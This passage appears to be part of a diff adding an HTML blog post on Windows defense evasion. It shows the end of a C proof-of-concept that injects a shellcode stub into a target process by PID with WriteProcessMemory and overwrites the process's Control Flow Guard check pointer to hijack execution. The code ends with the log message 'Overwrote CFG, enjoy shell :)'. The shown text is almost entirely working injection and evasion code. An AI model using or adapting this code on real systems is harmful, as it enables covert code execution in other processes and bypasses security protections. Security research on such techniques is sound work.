class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xd2</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0xc3</span>
+    <span class="p">};</span>
+    <span class="n">HMODULE</span> <span class="n">kernel32</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"KERNEL32.DLL"</span><span class="p">);</span>
+    <span class="n">FARPROC</span> <span class="n">_VirtualProtect</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+    <span class="n">FARPROC</span> <span class="n">_CreateThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span> <span class="s">"CreateThread"</span><span class="p">);</span>
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">shellcode_address</span> <span class="o">=</span> <span class="n">base_address</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">44</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">68</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_VirtualProtect</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">93</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">138</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">148</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_CreateThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+
+    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">base_address</span><span class="p">,</span> <span class="n">stub</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">stub</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">shellcode_address</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">LOG_SUCCESS</span><span class="p">(</span><span class="s">"Successfully wrote shellcode to target process"</span><span class="p">);</span>
+
+    <span class="c1">//</span>
+    <span class="c1">// Overwrite CFG with PTR</span>
+    <span class="c1">//</span>
+    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">BOOL</span> <span class="n">success</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">base_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">success</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">),</span> <span class="n">oldprotect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+    <span class="n">LOG_SUCCESS</span><span class="p">(</span><span class="s">"Overwrote CFG, enjoy shell :)"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">LOG_ERROR</span><span class="p">(</span>
+            <span class="s">"Invalid usage!</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"    Usage: %s &lt;pid&gt;"</span><span class="p">,</span>
+            <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">INT</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">poc</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html"></a>
+</article>
+
+      </div>
+    </main>
+
+
+</body></html>
